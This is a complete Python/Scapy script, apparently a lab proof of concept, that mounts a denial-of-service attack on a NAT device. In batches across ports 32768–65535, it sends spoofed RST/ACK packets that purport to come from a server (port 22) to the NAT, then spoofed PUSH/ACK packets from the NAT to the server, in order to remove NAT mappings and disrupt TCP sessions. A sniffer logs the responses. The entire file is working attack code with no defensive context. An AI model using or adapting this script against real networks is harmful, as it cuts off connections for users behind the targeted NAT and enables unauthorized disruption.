#!/usr/bin/env python3
from scapy.all import *
import threading
import random
import time

# =============================================================
# Configuration
# =============================================================

IFACE = "enxc8a362c3e003"
VICTIM_SERVER_IP = "11.0.0.100"
VICTIM_SERVER_PORT =  22
NAT_IP = "20.0.0.1"
CLIENT_PORT_START = 32768
CLIENT_PORT_END = 65535
BATCH_SIZE = 1000

def rand_seq():
    """Generates a random 32-bit seq/acknumber."""
    return random.randint(0, 0xFFFFFFFF)

def print_config_summary():
    """Configuration."""
    print("\n[*] Configuration Summary:")
    print(f"    Interface: {IFACE}")
    print(f"    Victim Server IP/Port: {VICTIM_SERVER_IP}:{VICTIM_SERVER_PORT}")
    print(f"    Vulnerable NAT IP: {NAT_IP}")
    print(f"    Client Port Range: {CLIENT_PORT_START}-{CLIENT_PORT_END}")
    print(f"    Batch Size: {BATCH_SIZE} ports per batch")

def attack_batch(server_ip, server_port, nat_ip, port_range):
    
    start_port, end_port = port_range
    ports = list(range(start_port, min(start_port + BATCH_SIZE, end_port + 1)))
    
    print(f"\n[*] Attacking batch: ports {start_port} to {start_port + len(ports) - 1}")
    
    # --- Stage 1: Removing NAT Mappings via Forged RST/ACK from Server to NAT ---
    print(f"  [>] Sending RST/ACK packets (Stage 1)...")
    
    for client_port in ports:
        rst_pkt = IP(src=server_ip, dst=nat_ip) / \
                  TCP(sport=server_port, dport=client_port, flags="RA", 
                      seq=rand_seq(), ack=rand_seq())
        send(rst_pkt, count=2, verbose=0, iface=IFACE) # 2 packet per port.
    
    print(f" Sent {len(ports)} RST/ACK packets.")
    time.sleep(0.5)
    
    # --- Stage 2: Manipulating TCP States via Forged PUSH/ACK from NAT to Server ---
    print(f"  [>] Sending PUSH+ACK packets (Stage 2)...")
    
    for client_port in ports:
        push_ack_pkt = IP(src=nat_ip, dst=server_ip) / \
                       TCP(sport=client_port, dport=server_port, flags="PA",
                           seq=rand_seq(), ack=rand_seq())
        send(push_ack_pkt, count=2, verbose=0, iface=IFACE)  # 2 packet per port.
    
    print(f"  Sent {len(ports)} PUSH+ACK packets.")
    print(f"  Batch completed.")

def packet_callback(pkt):
    if IP in pkt and TCP in pkt:
        print(f"[+] Captured Packet: {pkt.summary()}")

# ======= MAIN PROGRAM =======
try:
    print("[*] DoS against NAT")
    print("=" * 70)
    print_config_summary()

    total_ports = CLIENT_PORT_END - CLIENT_PORT_START + 1
    batches = (total_ports + BATCH_SIZE - 1) // BATCH_SIZE
    
    print(f"\n[*] Targeting {total_ports} ports in {batches} batches.")
     
    sniffer = AsyncSniffer(
        iface=IFACE,
        filter=f"tcp and (host {VICTIM_SERVER_IP} or host {NAT_IP})",
        prn=packet_callback,
        store=False
    )
    sniffer.start()
    time.sleep(2)
    
    print("\n[*] Starting attack...")
    print("=" * 70)

    for batch_num in range(batches):
        batch_start = CLIENT_PORT_START + (batch_num * BATCH_SIZE)
        batch_end = min(batch_start + BATCH_SIZE - 1, CLIENT_PORT_END)
        
        if batch_start > CLIENT_PORT_END:
            break
            
        attack_batch(VICTIM_SERVER_IP, VICTIM_SERVER_PORT, NAT_IP, (batch_start, batch_end))
        
        if batch_num < batches - 1:
            time.sleep(1.0) 

    print("\n" + "=" * 70)
    print(f" Attack run completed: {total_ports} ports processed in {batches} batches.")
    sniffer.stop()
    print("[*] Sniffing stopped.")
    
except NameError:
    print("\n[!] ERROR: Ensure all configuration variables at the top of the script are correctly defined.")
    exit(1)
except KeyboardInterrupt:
    print("\n[!] Attack stopped by user.")
    sniffer.stop()
    exit(1)
